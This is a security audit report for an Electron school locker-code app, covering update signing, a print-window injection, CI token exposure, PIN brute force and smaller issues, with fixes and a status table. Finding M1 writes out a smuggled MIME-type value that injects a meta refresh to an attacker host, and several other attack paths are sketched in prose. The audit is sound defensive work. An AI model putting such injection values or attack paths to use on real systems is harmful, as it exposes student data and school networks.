# Security and privacy review: Locker Manager

_9 October 2026. Reviewed at commit `ae0f6f8` (main). Report only: no source, tests or docs were changed._

Scope: the Electron main process, preload, renderer previews, HTML rendering for labels, letters and reports, code encryption and the PIN, logs, imports and exports, the updater, GitHub Actions workflows and the npm dependency tree. Each finding below was checked in the code, and two were checked by running Electron (noted where so).


## Status, 18 October 2026

| Finding | Status |
|---|---|
| H1 unsigned Windows updates | Waits on Dave: buy signing, then immutable releases, a `v*` tag ruleset and a reviewer on the `release` environment (docs/signing.md). The IT guide now says unsigned updates trust GitHub alone and how to turn them off. |
| M1 hidden print windows | Fixed (a7ce6a8) |
| M2 release pipeline | Fixed (d4b6bbe) |
| M3 PIN wrong-try limit resets | Open: needs Dave's call on a longer wait and a 6-digit minimum |
| L1 `file_id` path | Fixed (a040ffb) |
| L2 print recorded after printing | Fixed (3e1378f) |
| L3 temporary pages left after a crash | Fixed: `sweepRenderTemp` at start-up removes pages over an hour old |
| L4 managed settings override | Fixed: the override works only unpackaged; Windows path is fixed at `C:\ProgramData`. Test in privacy.test.ts |
| L5 Mac entitlements | Waits on a Developer ID certificate |
| L6 file size before parsing | Fixed: import files 50 MB, settings files 20 MB, workbook exports 100 MB |
| L7 permission requests | Fixed: refused on the window's and the print windows' sessions |
| L8 CSV header not made safe | Fixed. Test in reports.test.ts |
| L9 Electron fuses | Open: needs a packaged build and a Mac self-update proof to check |
| N2 copies on each computer | IT guide now says per-computer backups hold codes |
| N3 `resolveCopy` takes any name | Fixed. Test in session.test.ts |
| N4 `startsWith` link check | Fixed: `isAllowedExternalUrl` everywhere |
| N5 open by any path | Fixed: only recent files and IT's default file |
| N6 sender check | Not done: one trusted page, low value |
| N7 uuid advisory | Recorded in CLAUDE.md, Known, accepted (only `v4()` is called) |
| N8 PDFs and settings files not ignored | Fixed in .gitignore and the student-data check |

## Summary

| Rank | Count |
|---|---|
| Critical | 0 |
| High | 1 |
| Medium | 3 |
| Low | 9 |
| Note | 8 |

No finding lets someone without the data file or without control of the release pipeline read student data or codes. The highest risks are in how updates reach schools (anyone who controls the GitHub repository can push code to every Windows install) and in a crafted data file or workbook being able to load a web page inside the app's hidden print windows.

---

## High

### H1. Windows updates are installed with no signature check: control of the GitHub repository means code on every school's PC

**Evidence**
- `src/main/update/policy.ts:40-48`: Windows is always `'auto'` mode.
- `src/main/update/updater.ts:38-39`: `autoDownload` and `autoInstallOnAppQuit` are on in auto mode.
- `electron-builder.yml:68-72`: no `publisherName` while unsigned, so electron-updater's Windows signature check (which compares the installer's Authenticode publisher with `publisherName` in `app-update.yml`) has nothing to compare and is skipped.
- The only integrity check is the `sha512` in `latest.yml`, which sits on the same GitHub Release as the installer.
- `.github/workflows/rollout.yml:37-44` shows the release assets are designed to be replaced in place (`gh release upload ... --clobber`).

**Scenario.** Someone obtains a token or session with write access to `mrdavearms/locker-manager` (a phished GitHub login, a leaked personal access token, or a malicious npm package running in the release job, see M2). They upload a new `Locker-Manager-Setup-x.y.z.exe` and a matching `latest.yml` to the newest release, or push a new tag. Within four hours (`CHECK_INTERVAL_MS`) every Windows install downloads it, and it installs when staff next close the app. It runs as the staff member, with the school's shared folder (every student name and every code) within reach.

**Suggested fix.**
1. Sign Windows builds (Azure Artifact Signing is already wired up) and set `win.publisherName` so electron-updater refuses an installer from anyone else. This is the real fix.
2. Until then: turn on GitHub's immutable releases for the repository (assets cannot be replaced after publishing), protect `v*` tags with a ruleset, require a hardware security key for the GitHub account, and run the release job in a GitHub Environment with a required reviewer. Immutable releases conflict with `rollout.yml` re-uploading `latest.yml`; either drop staged rollout until signing lands, or set `stagingPercentage` before publishing.
3. Say plainly in `docs/it-guide.md` that unsigned Windows builds trust GitHub alone, and that IT can turn automatic install off through `managed.json`.

---

## Medium

### M1. A crafted data file or workbook can make the hidden print windows load a web page

**Evidence**
- `src/main/repos/school.ts:28-31`: the logo data URL is built from the `logo_type` column with no check.
- `src/main/repos/letters.ts:72-74`: picture data URLs are built from the `image.mime` column with no check.
- These strings go into HTML unescaped: `src/main/render/labelSheet.ts:73` (`<img src="${src}">`), `src/main/render/letter.ts:105` (inside a `<style>` element) and `src/main/render/letter.ts:247` (inside a `style` attribute).
- `src/main/portable/workbook.ts:312-319` cleans `school.logo_type` on import from a workbook, but not `image.mime`, so a tampered portable export carries the problem in.
- `src/main/render/pdf.ts:19-31`: the hidden window has a window-open handler but no `will-navigate` handler.

**Verified by running Electron 44.5.1.** A page loaded the same way as `pdf.ts` (JavaScript off, sandboxed, a `default-src 'none'` CSP meta tag) containing `<meta http-equiv="refresh" content="0;url=https://example.com/">` navigated to `https://example.com/`. A Content Security Policy does not govern navigation.

**Scenario.** Someone with write access to the shared folder, or someone who sends a school a `.lockers` file or a "portable export" workbook, sets a picture's type to `image/png)}</style><meta http-equiv="refresh" content="0;url=https://attacker.example/">`. When staff make letters, the letter check window (`overflowingLetters`, which runs with JavaScript on) and the print window load the attacker's page. What follows:
- The attacker learns the school's IP address and when letters were printed.
- "Print letters" sends the attacker's page to the printer: there is no page-count check on the print path (`documentService.ts:224-243`). It could be a convincing fake letter to families.
- Labels do the same through `logo_type` (`renderService.ts:111-143`).

Codes are not exposed, because the letter page is replaced, not read. The window has no preload and is sandboxed.

**Suggested fix.**
- In `withPage` (`pdf.ts`), add `win.webContents.on('will-navigate', (e) => e.preventDefault())` and also `will-redirect`. Better still, use `session.fromPartition('render')` with `webRequest.onBeforeRequest` cancelling anything that is not `file:` or `data:`.
- Allow-list the type when building data URLs (`png`, `jpeg`, `svg+xml`, otherwise null), in `school.ts` and `letters.ts`.
- Apply the same clean-up to `image.mime` in `importWorkbook`.

### M2. The release job hands a repository write token to every npm install script

**Evidence**
- `.github/workflows/release.yml:21-22`: `permissions: contents: write` for the whole workflow.
- `release.yml:76` and `:81`: `actions/checkout@v5` keeps the token in `.git/config` by default (`persist-credentials` is not set to false), then `npm ci` runs every dependency's install scripts in the same job.
- `release.yml:89-125`: later steps in that job also get the signing secrets.

**Scenario.** A compromised dependency (direct or deep, about 900 packages) adds a `postinstall` script. In the release job it reads the persisted token from `.git/config` and replaces release assets or the tag. That is the H1 attack without needing Dave's account. Once signing secrets exist, a script that leaves a background process running can also read them from the environment of later steps.

**Suggested fix.**
- Set `persist-credentials: false` on every checkout in `release.yml` and `update-proof.yml`.
- Give `contents: write` only to the jobs that need it (`create-draft`, `build`, `publish`) and `contents: read` elsewhere.
- Run `npm ci --ignore-scripts` and then rebuild only what needs it (electron's own install script downloads the binary, so test this).
- Pin third-party and first-party actions by commit SHA (they are pinned by major tag now: `actions/checkout@v5`, `actions/setup-node@v5`, `actions/upload-artifact@v4`, `actions/*-pages@v*`). Turn on Dependabot for actions.

### M3. The PIN does not hold against a person sitting at the computer, and resets on restart

**Evidence**
- `src/main/privacy.ts:22-24` and `:90-107`: failure counting is in memory only. Five wrong PINs give a 30-second wait.
- `privacy.ts:28-34`: opening a different file resets `failures` (but not `waitUntil`), and restarting the app resets everything.
- `privacy.ts:123`: a PIN may be 4 digits (10,000 choices).

**Scenario.** A staff member without the PIN, at an unlocked office PC that holds the file for editing, tries 5 PINs, restarts the app (a few seconds), and repeats. All 10,000 four-digit PINs take a few hours by hand, and minutes with a keyboard script. Separately, `scryptSync` with Node's defaults (N=16384) means the stored hash in the file's `settings` table falls to an offline search of all 4-digit PINs in well under a minute. This matters less, because the code key is in the same file (see Note N1).

This is documented as a casual-viewing gate (`docs/user-guide.md:714`, `PrivacyForm.tsx:41`), so it is ranked Medium, not High. But SPEC.md 9.5 lets IT *require* a PIN, which suggests more protection than it gives.

**Suggested fix.**
- Keep the failure count and wait-until time in `preferences.json` (per computer, per file path) so a restart does not reset them.
- Make the wait grow after each round (30 s, 2 min, 10 min).
- Record wrong PINs in the history.
- Consider 6 digits as the minimum when IT requires a PIN.
- Say in the IT guide that the PIN does not protect against someone who can copy the file.

---

## Low

### L1. A data file can steer this computer's backup folder anywhere on the disk

`src/main/file/session.ts:590-594` builds the local backup folder as `join(localBackupRoot, getMeta(db, 'file_id'))`. `file_id` comes from the file and is never checked. A file with `file_id = ../../../../Desktop/x` makes `writeBackup` (`backups.ts:177-186`) create that folder and write a `.lockers` copy there on every save. It also prunes older `.lockers` files in that folder whose names match the data file's base name (`backups.ts:188-195`). There is no code execution because the extension is fixed, but it is a path traversal driven by file contents. **Fix:** accept `file_id` only if it matches `/^[A-Za-z0-9-]{8,64}$/`, otherwise use a SHA-256 of the value.

### L2. Printed letters and reports are recorded after printing, and a failed record is only logged

`documentService.ts:224-243` and `:263-283` print first, then call `recordLetters` / `recordReport`. These re-check the PIN (`recordBlocked`, line 131-138). If the 10-minute unlock runs out while the print dialog is open, or another computer takes over editing, the codes are on paper but `code_reveal_log` has no entry. Only `log.warn` notes it. Saving to PDF does record first. **Fix:** write the reveal record before opening the print dialog, adding a "cancelled" history line if the operator cancels; or skip the PIN re-check at recording time once the job has passed it.

### L3. Letters with real codes are written to the temporary folder in plain HTML

`pdf.ts:17-18` writes each page to `tmpdir()` (mode 0600) and deletes it in `finally`. If the app is killed or crashes mid-render, a file holding student names and lock codes stays in `%TEMP%` or `$TMPDIR` indefinitely. **Fix:** load the HTML from memory through a custom protocol registered on a private session, or sweep `locker-manager-*.html` older than an hour on start-up.

### L4. Managed settings can be sidestepped with an environment variable

`src/main/managed.ts:10` honours `LOCKER_MANAGER_MANAGED` in installed builds as well as tests, and `:12` trusts the user-changeable `ProgramData` variable. A staff member can start the app with `LOCKER_MANAGER_MANAGED=nothing.json` to drop IT's "require a PIN", "no demo" or "no automatic updates". **Fix:** honour the override only when `!app.isPackaged`, and use a fixed `C:\ProgramData` path (or `SHGetKnownFolderPath`) on Windows.

### L5. Mac entitlements allow code injection once the app is signed

`resources/build/entitlements.mac.plist` grants `allow-dyld-environment-variables` and `disable-library-validation`. The comment says these are harmless once signed. They are not: on a Developer ID build they let `DYLD_INSERT_LIBRARIES` load any library into the app. **Fix:** remove both when the Developer ID certificate arrives (Electron does not need them when everything carries one Team ID). Add Electron fuses at the same time (L9).

### L6. No limit on the size of imported files

`rpc.ts:159-164` limits `import.load` to 12 files but not their size. `importWorkbook` (`fileService.ts:428`) and the settings import (`fileService.ts:312`) read whole files with no cap. `parse.ts:20` caps rows at 20,000 only after the whole sheet is parsed. A large or zip-bomb XLSX freezes or crashes the main process. Unsaved changes are lost, and the edit lock stays until it goes stale. **Fix:** refuse files over about 50 MB before parsing, and catch the error.

### L7. No permission request handler

No `session.setPermissionRequestHandler` or `setPermissionCheckHandler` exists (searched `src/main`). Electron grants camera, microphone, location and notifications by default. This matters only if the renderer were ever compromised. **Fix:** deny everything: `session.defaultSession.setPermissionRequestHandler((_wc, _p, cb) => cb(false))`.

### L8. CSV export header row is not formula-guarded

`reports/export.ts:30` passes `rows.map(safe)` but not `header`. Column labels come from the school's terminology, so a value like `=HYPERLINK(...)` typed into Settings, Words, or imported from a `.lockersettings` file, reaches the spreadsheet as a formula. **Fix:** `[header.map(safe), ...rows.map((r) => r.map(safe))]`.

### L9. No Electron fuses

There is no `@electron/fuses` step and no `electronFuses` in `electron-builder.yml`. `RunAsNode`, `EnableNodeOptionsEnvironmentVariable` and `EnableNodeCliInspectArguments` stay on, and asar integrity is off. A local user can run the installed app as plain Node, or attach a debugger, and use its file associations and trust. **Fix:** add `electronFuses` in `electron-builder.yml` (`runAsNode: false`, `enableNodeOptionsEnvironmentVariable: false`, `enableNodeCliInspectArguments: false`, `onlyLoadAppFromAsar: true`, `enableEmbeddedAsarIntegrityValidation: true`).

---

## Notes

- **N1. Codes are protected only against casual viewing.** AES-256-GCM is used correctly in `src/main/codes/cipher.ts`: a fresh 12-byte random IV for each code (line 27), the tag checked (line 37), and a 32-byte random key. The key sits in `meta.code_key_v1` in the same file (line 9-16), so anyone with the file can decrypt every code with a few lines of script. The PIN hash is in the same file too, and corrupting the `privacy` setting turns the PIN off (`repos/settings.ts:17-22` falls back to the default). This matches SPEC.md 8.6 and is stated in `docs/it-guide.md:212`, `CodesForm.tsx:267` and the user guide. Student names are not encrypted at all, which is also by design. The honest summary for schools: whoever can read the shared folder (including its `Locker Manager backups` folder) can read every code.
- **N2. Copies spread to every computer.** Each computer that opens the file keeps local backups (`userData/backups/<file_id>`), and a practice copy holds every code (`fileService.ts:278-283`). This is intended (SPEC.md 6.5), but school IT should know about it when a staff laptop is lost or reassigned. Worth a line in the IT guide's privacy section.
- **N3. `resolveCopy` does not check the name is a detected conflict copy.** `session.ts:850-856`, unlike `compareCopy` (line 817). Any `.lockers` file in the same folder can replace the school file if the renderer asks. This needs a compromised renderer; add the same `conflictCopies.includes` check for consistency.
- **N4. The window-open handler uses `startsWith`.** `window.ts:72` and `recovery.ts:78` use `url.startsWith(brand.repoUrl)`, which also matches `https://github.com/mrdavearms/locker-manager-anything`. The IPC route uses the stricter `isAllowedExternalUrl` (`shared/externalUrls.ts`). Use that everywhere.
- **N5. Renderer-supplied paths.** `file:openPath` and `file:forgetRecent` accept any path ending `.lockers` (`ipc.ts:108-113`), including a network path. Normal use only sends paths from the recent list. A compromised renderer could make Windows contact an SMB server (NTLM hash leak). Consider accepting only paths already in `recentFiles`.
- **N6. No IPC sender check.** Handlers do not check `event.senderFrame.url`. Only one trusted page exists and iframes are `sandbox=""`, so the risk is theoretical.
- **N7. npm audit.** `npm audit --omit=dev`: 2 moderate, both `uuid <11.1.1` through `exceljs`. ExcelJS calls only `uuid.v4()` with no buffer argument (`exceljs/lib/xlsx/xform/sheet/cf-ext/cf-rule-ext-xform.js:1,43,77`), so the bounds-check flaw is not reachable. This one does ship inside the app. Full `npm audit`: 10 moderate. The other 8 are `sprintf-js` through electron-builder, which runs on the build machine only (already in CLAUDE.md "Known, accepted"). SheetJS is 0.20.3 from the official CDN, which includes the prototype-pollution and ReDoS fixes. Electron is 44.5.1, and electron-updater is 6.8.9.
- **N8. Repository hygiene gaps.** `scripts/check-no-student-data.mjs` and `.gitignore` do not cover `*.pdf` (letters and reports hold names and codes) or `*.lockersettings`, and `git check-ignore x.pdf` confirms PDFs are not ignored. Add `*.pdf` (with `!tests/golden/**`) and `*.lockersettings` to both. The check passes today (311 files, nothing suspicious). Untracked `.claude-tour/` holds only test files.

---

## Checked and found sound

- **Main window** (`window.ts:58-75`): `contextIsolation`, `sandbox`, `nodeIntegration: false`, `webSecurity`, no insecure content. Navigation is blocked and window opening is denied. Devtools and reload are only in the menu for unpackaged builds (`menu.ts:57-59`).
- **Content Security Policy.** The header is installed on the default session (`window.ts:35-44`). It was **checked by running the built app**: the `file://` renderer page refused an injected inline script and a remote image, with violations reported against `script-src 'self'` and `img-src`. Label, letter and report HTML carry their own `default-src 'none'` meta policy as well. Previews in the window use `sandbox=""` iframes (`SheetPreview.tsx:50-54`, `ReportsScreen.tsx:45-48`).
- **Recovery page** (`recovery.ts`): JavaScript off, CSP meta, its own links handled in main, version and paths escaped.
- **IPC.** Preload exposes named functions only, never `ipcRenderer` itself (`preload/index.ts`). Every channel parses its input with Zod. The single `rpc` channel checks the method name and schema (`rpc/registry.ts:46-55`), and TypeScript forces a handler per method. Backup and copy names refuse slashes. `render:openPdf` opens only files this session wrote (`renderService.ts:162-166`). All save and open locations come from native dialogs.
- **External links.** `shell.openExternal` from the window goes through `isAllowedExternalUrl` (https, github.com, this repository only). QR links are matched with a strict pattern and carry only a short ID (`links.ts:10-13`). The SQL query is parameterised.
- **HTML escaping.** `render/html.ts` escapes `& < > " '`. Names, merge fields, headings, terminology and report cells all go through it. The letter word format escapes before adding `<b>`. The in-app guide is parsed to data and rendered as React elements, with no `dangerouslySetInnerHTML` anywhere in `src`. SVG pictures are only ever used as `<img>` or CSS backgrounds, where scripts do not run.
- **Code generation** uses `crypto.randomInt` (`codes/random.ts:12`). The seeded mode is HMAC-SHA256 with rejection sampling, for test sets only.
- **Reveal logging.** Every `decryptCode` call was traced. Screen reveals, recode, assign and move go through `revealCode` / `shownCode`. Letters, reports and whole-file exports record before writing a file. Previews are masked (`letters.preview` uses `masked: true`, `reports.preview` uses `maskCodes`). `problems.ts` and `takenCodes` decrypt but return only counts or use codes internally. The only gap is L2.
- **PIN comparison** uses scrypt with a per-PIN 16-byte salt and `timingSafeEqual`. Changing or removing the PIN needs the current one.
- **Logs.** All 22 `log.*` calls in `src/main` were read. None carries a name, student ID or code. electron-log's catch-all error handler is not switched on.
- **Exports.** CSV cells starting `= + - @ tab CR` are prefixed with `'`. XLSX cells are written as text, never formulas. Exports with codes are named and marked CONFIDENTIAL. The settings file import is validated with a strict Zod schema, and settings are re-validated on every read.
- **Updater.** `allowDowngrade = false`. Pre-releases are accepted only below 1.0.0 or on the beta channel. An unsigned Mac only opens the download page. Update errors are quiet unless the check was manual.
- **Workflows.** No `pull_request_target`. CI has read-only permissions. Inputs to `rollout.yml` are passed through `env:` and checked with a regex before use. No `${{ }}` expression is interpolated into a `run:` line with untrusted content. The version-check job fails fast on a tag mismatch.
